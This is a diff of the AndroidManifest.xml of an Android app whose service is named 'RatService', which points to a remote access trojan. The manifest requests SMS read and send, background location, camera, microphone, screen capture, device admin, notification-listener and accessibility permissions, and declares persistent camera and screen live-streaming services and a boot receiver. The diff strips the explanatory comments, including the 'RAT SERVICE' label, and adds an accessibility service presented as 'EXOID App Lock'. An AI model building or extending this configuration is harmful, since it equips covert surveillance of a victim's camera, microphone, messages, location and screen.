@@ -2,14 +2,12 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     xmlns:tools="http://schemas.android.com/tools">
 
-    <!-- ============ NETWORK ============ -->
     <uses-permission android:name="android.permission.INTERNET"/>
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
     <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
     <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
     <uses-permission android:name="android.permission.CHANGE_NETWORK_STATE"/>
 
-    <!-- ============ FOREGROUND SERVICE ============ -->
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC"/>
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA"/>
@@ -20,24 +18,20 @@
     <uses-permission android:name="android.permission.WAKE_LOCK"/>
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
 
-    <!-- ============ CAMERA / FLASH ============ -->
     <uses-permission android:name="android.permission.CAMERA"/>
     <uses-permission android:name="android.permission.FLASHLIGHT"/>
     <uses-feature android:name="android.hardware.camera" android:required="false"/>
     <uses-feature android:name="android.hardware.camera.front" android:required="false"/>
     <uses-feature android:name="android.hardware.camera.flash" android:required="false"/>
 
-    <!-- ============ AUDIO ============ -->
     <uses-permission android:name="android.permission.RECORD_AUDIO"/>
     <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
 
-    <!-- ============ SMS ============ -->
     <uses-permission android:name="android.permission.READ_SMS"/>
     <uses-permission android:name="android.permission.RECEIVE_SMS"/>
     <uses-permission android:name="android.permission.SEND_SMS"/>
     <uses-permission android:name="android.permission.RECEIVE_MMS"/>
 
-    <!-- ============ STORAGE / MEDIA ============ -->
     <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"
         android:maxSdkVersion="32"/>
     <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"
@@ -48,12 +42,10 @@
     <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"
         tools:ignore="ScopedStorage"/>
 
-    <!-- ============ LOCATION ============ -->
     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
     <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
 
-    <!-- ============ HARDWARE ============ -->
     <uses-permission android:name="android.permission.VIBRATE"/>
     <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
     <uses-permission android:name="android.permission.READ_PHONE_NUMBERS"/>
@@ -64,21 +56,19 @@
     <uses-permission android:name="android.permission.SET_WALLPAPER_HINTS"/>
     <uses-permission android:name="android.permission.EXPAND_STATUS_BAR"/>
     <uses-permission android:name="android.permission.DISABLE_KEYGUARD"/>
+    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"
+        tools:ignore="QueryAllPackagesPermission"/>
 
-    <!-- ============ SYSTEM / OVERLAY ============ -->
     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
     <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
     <uses-permission android:name="android.permission.REQUEST_DELETE_PACKAGES"/>
-    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"
-        tools:ignore="QueryAllPackagesPermission"/>
     <uses-permission android:name="android.permission.KILL_BACKGROUND_PROCESSES"/>
     <uses-permission android:name="android.permission.REORDER_TASKS"/>
 
-    <!-- ============ DEVICE ADMIN ============ -->
     <uses-permission android:name="android.permission.BIND_DEVICE_ADMIN"/>
-
-    <!-- ============ NOTIFICATION LISTENER ============ -->
     <uses-permission android:name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
+        tools:ignore="ProtectedPermissions"/>
+    <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE"
         tools:ignore="ProtectedPermissions"/>
 
     <application
@@ -96,7 +86,6 @@
         android:requestLegacyExternalStorage="true"
         tools:targetApi="35">
 
-        <!-- ============ SETUP USERNAME ACTIVITY (LAUNCHER) ============ -->
         <activity
             android:name=".SetupUsernameActivity"
             android:exported="true"
@@ -108,7 +97,6 @@
             </intent-filter>
         </activity>
 
-        <!-- ============ MAIN ACTIVITY ============ -->
         <activity
             android:name=".MainActivity"
             android:exported="false"
@@ -117,36 +105,42 @@
             android:configChanges="orientation|screenSize|keyboardHidden"
             android:screenOrientation="portrait"/>
 
-        <!-- ============ RAT SERVICE ============ -->
         <service
             android:name=".RatService"
             android:exported="false"
             android:foregroundServiceType="dataSync|camera|microphone|location|mediaProjection"
             android:stopWithTask="false"/>
 
-        <!-- ============ LOCK SERVICE ============ -->
         <service
             android:name=".LockService"
             android:exported="false"
             android:foregroundServiceType="dataSync"
             android:stopWithTask="false"/>
-            
-           <!-- Camera Live Stream -->
- <!-- Camera Live Stream -->
-<service
-    android:name=".CameraStreamService"
-    android:exported="false"
-    android:foregroundServiceType="camera|dataSync"
-    android:stopWithTask="false"/>
 
-<!-- Screen Live Stream -->
-<service
-    android:name=".ScreenStreamService"
-    android:exported="false"
-    android:foregroundServiceType="mediaProjection|dataSync"
-    android:stopWithTask="false"/>
+        <service
+            android:name=".CameraStreamService"
+            android:exported="false"
+            android:foregroundServiceType="camera|dataSync"
+            android:stopWithTask="false"/>
 
-        <!-- ============ NOTIFICATION LISTENER SERVICE ============ -->
+        <service
+            android:name=".ScreenStreamService"
+            android:exported="false"
+            android:foregroundServiceType="mediaProjection|dataSync"
+            android:stopWithTask="false"/>
+
+        <service
+            android:name=".VideoPlayerService"
+            android:exported="false"
+            android:foregroundServiceType="dataSync"
+            android:stopWithTask="false"/>
+
+        <service
+            android:name=".AudioPlayerService"
+            android:exported="false"
+            android:foregroundServiceType="dataSync"
+            android:stopWithTask="false"/>
+
         <service
             android:name=".NotificationListener"
             android:exported="true"
@@ -157,7 +151,19 @@
             </intent-filter>
         </service>
 
-        <!-- ============ DEVICE ADMIN RECEIVER ============ -->
+        <service
+            android:name=".AppLockAccessibilityService"
+            android:exported="false"
+            android:label="EXOID App Lock"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService"/>
+            </intent-filter>
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/accessibility_service_config"/>
+        </service>
+
         <receiver
             android:name=".AdminReceiver"
             android:permission="android.permission.BIND_DEVICE_ADMIN"
@@ -172,7 +178,6 @@
             </intent-filter>
         </receiver>
 
-        <!-- ============ BOOT RECEIVER ============ -->
         <receiver
             android:name=".BootReceiver"
             android:exported="true"
@@ -185,7 +190,6 @@
             </intent-filter>
         </receiver>
 
-        <!-- ============ FILE PROVIDER ============ -->
         <provider
             android:name="androidx.core.content.FileProvider"
             android:authorities="${applicationId}.fileprovider"
